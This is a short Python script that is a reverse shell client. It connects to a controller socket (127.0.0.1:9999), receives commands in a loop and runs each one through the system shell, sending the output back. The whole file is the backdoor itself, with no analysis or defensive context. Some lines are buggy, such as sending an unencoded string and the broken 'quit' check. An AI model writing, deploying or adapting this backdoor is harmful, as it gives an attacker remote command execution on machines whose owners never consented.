# -*- coding: cp1254 -*-

__author__ = "bomch4nte"
__date__ = "17.12.2017"


import os
import socket
import subprocess

try:
    s = socket.socket()
    host = '127.0.0.1'
    port = 9999
    s.connect((host, port))


    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            s.send(output_str)
            print(output_str)
        elif cmd == 'quit':
            break

    # Close connection
    s.close()
except:
    print("Connection refused, please solve problems and try again.. ")